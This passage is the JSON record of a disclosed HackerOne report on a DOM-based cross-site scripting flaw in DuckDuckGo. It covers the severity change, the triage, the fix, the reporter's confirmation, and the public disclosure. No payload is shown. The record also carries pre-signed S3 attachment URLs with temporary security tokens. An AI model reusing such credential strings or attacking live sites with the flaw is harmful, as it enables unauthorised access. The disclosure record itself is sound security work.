ezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026amp;X-Amz-Signature=88c18bf871ca09322168621e22bd3113d730576f32657cda215f028bc5484c55\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAttacker can execute JavaScript.\u003c/p\u003e\n","weakness":{"id":63,"name":"Cross-site Scripting (XSS) - DOM"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":904609,"file_name":"firefox2-2020-07-12_19.04.05.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdWcfWmVDwrLLrwa4NRCf7nK?response-content-disposition=attachment%3B%20filename%3D%22firefox2-2020-07-12_19.04.05.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox2-2020-07-12_19.04.05.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071120Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=eb721d9c2b42b5d2e4105a8184aaf8fe355978f1fdd6a48d6077dd2c18189d97","file_size":1799206,"type":"video/mp4"},{"id":904637,"file_name":"chromium2-2020-07-12_19.36.47.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytuzBbf82jA7u61ALBTsiZW3?response-content-disposition=attachment%3B%20filename%3D%22chromium2-2020-07-12_19.36.47.mp4%22%3B%20filename%2A%3DUTF-8%27%27chromium2-2020-07-12_19.36.47.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071120Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=76937373335014f18333db44ad9074027ba8815f9c8b6969cf5c811afb098fef","file_size":1535136,"type":"video/mp4"},{"id":904653,"file_name":"firefox3-2020-07-12_19.59.04.mp4","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wRgY6vRS32iwaTEVvrsPM8Ut?response-content-disposition=attachment%3B%20filename%3D%22firefox3-2020-07-12_19.59.04.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox3-2020-07-12_19.59.04.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXIQUJBND%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071120Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCSW9e%2BCRLewnzIhfyUQIFZeIhP4IGWCtHUT2hLFjUN4QIgKlrrsSX7JO9AUtPC04DkQ4aqLCIc%2BtgaHrxUzRKsC2EqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDDeiStP9%2BOCDWdMNKCqRA2JJf1iaqRkqschykUnKmwKiU3mJNUd3tkRImvwu5rabEwETxSiWl5k1kbJ0rTepHnMF3Fv2BRaAbpd1Vu0t2aoIEry7oqPe6o6SKLNKB%2BXC%2FexGMhqyRy2%2FcJmnp%2B5Qbq4tBzoRWltXila49CNBcejP2XLezBboRC4iI5sLOE6gGgKQbnNo8CZLUZRSMFPyQ2D9gknuxlNQWE5OnbIlVH2RUF6n2f2nLLYUSiCcJ0BLl1Beeo37jB6Wojtnwh11Mc%2B6okiB%2FQtCRRbD%2FZ86Ymf4vjs0qqYcryHFVE7cyPZG9c2QX1adH%2F1EfMwBCjJzj%2B04Mcc5iJ7n%2Bp2ijGUpL9crKoZzgg1sqPgrA7ytMwXoDiS51U7uYLQwN%2B7cmBg4QTch2FiC0lJkZZLsOrVsD9Ke0%2FG8JeqjI5VfRu6gZ8LcRjDzVP%2BvcywvsN%2BYNFrjkBnPkTivS70vAFg2%2F%2FIsbMCgVV8bZbqMDq2I2LPhB%2FdO0%2F7o17RoI%2FY4qsC33bs6oDHrJ30fQFSWo1%2B5YDS2wYwPMPeKq%2F8FOusBiH5C7%2B6u5qXM%2FEpYLYzxIMm0IE%2BPTIo1jWaPg%2F4O4SmgDlQdEkd4Z6kXuX29rGjT69ErbO%2B0Ni8rPyw2noLhVav9I7IYxC%2FNCNMiM2GpLEebjCVCSQBJXuEtMbpTP8RRMP9Kn6W4y6DOiVxDvkIVP8tt1ZjhS1RQyGqjugLB%2FwGVib1fxZTeqbYpERuKBFJveZoZ1DJigNDP4oL23KKbXSmzxasGghOyWEUuuVyRROrX7bBS0O20tta9FRuW1g0MuK6BnH9p4wKwoPeijO8WANNgYkL11mV7huAgWuS%2BhR6ZkaVAnYs5Wghrtw%3D%3D\u0026X-Amz-Signature=88c18bf871ca09322168621e22bd3113d730576f32657cda215f028bc5484c55","file_size":451306,"type":"video/mp4"}],"allow_singular_disclosure_at":"2020-08-20T15:49:34.022Z","allow_singular_disclosure_after":-11287306.295918584,"singular_disclosure_allowed":true,"vote_count":29,"voters":["secator","spam404","kapkan","leonishan","3x3s","sa1tama0","jesuser14","a5hu","geminied","michellium2","and 19 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":8671,"asset_type":"URL","asset_identifier":"*.duckduckgo.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8580464,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-13T10:10:30.438Z","updated_at":"2020-07-13T10:10:30.438Z","additional_data":{"old_severity":"High","new_severity":"Medium","old_severity_id":777075,"new_severity_id":777958},"actor":{"username":"lugtag","cleared":false,"url":"/lugtag","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8580466,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello @sijisu,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@lugtag","markdown_message":"\u003cp\u003eHello \u003ca href=\"/sijisu\"\u003e@sijisu\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/lugtag\"\u003e@lugtag\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-13T10:10:36.717Z","updated_at":"2020-07-13T10:10:36.717Z","actor":{"username":"lugtag","cleared":false,"url":"/lugtag","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/gKtXsNkprE7ekgjBwpwWpTzX/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8664199,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @sijisu, thanks for the report.\nThis should be fixed now, can you confirm?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/sijisu\"\u003e@sijisu\u003c/a\u003e, thanks for the report.\u003cbr\u003e\nThis should be fixed now, can you confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-21T14:20:17.974Z","updated_at":"2020-07-21T14:20:17.974Z","actor":{"username":"mariag","cleared":false,"url":"/mariag","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8664552,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @mariag,\n\nlooks fixed to me. The PoC URL doesn't work anymore.\n\nRegards,\n@sijisu","markdown_message":"\u003cp\u003eHey \u003ca href=\"/mariag\"\u003e@mariag\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003elooks fixed to me. The PoC URL doesn\u0026#39;t work anymore.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/sijisu\"\u003e@sijisu\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-21T14:59:01.686Z","updated_at":"2020-07-21T14:59:01.686Z","actor":{"username":"sijisu","cleared":false,"url":"/sijisu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8665484,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-21T15:42:03.815Z","updated_at":"2020-07-21T15:42:03.815Z","actor":{"url":"/duckduckgo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"DuckDuckGo"}},"reporter":{"username":"sijisu","url":"/sijisu"},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8665487,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-21T15:42:13.217Z","updated_at":"2020-07-21T15:42:13.217Z","actor":{"username":"mariag","cleared":false,"url":"/mariag","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"sijisu","url":"/sijisu"},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8665544,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thank you for the swag! Can we disclose this now?","markdown_message":"\u003cp\u003eThank you for the swag! Can we disclose this now?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-21T15:49:33.974Z","updated_at":"2020-07-21T15:49:33.974Z","first_to_agree":true,"actor":{"username":"sijisu","cleared":false,"url":"/sijisu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8990669,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-20T15:49:37.751Z","updated_at":"2020-08-20T15:49:37.751Z","actor":{"url":"/duckduckgo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/010/995/8b8a2ef803e7e6b78d77ea654f36894160dba4f6_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"DuckDuckGo"}},"genius_execution_id":null,"team_handle":"duckduckgo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}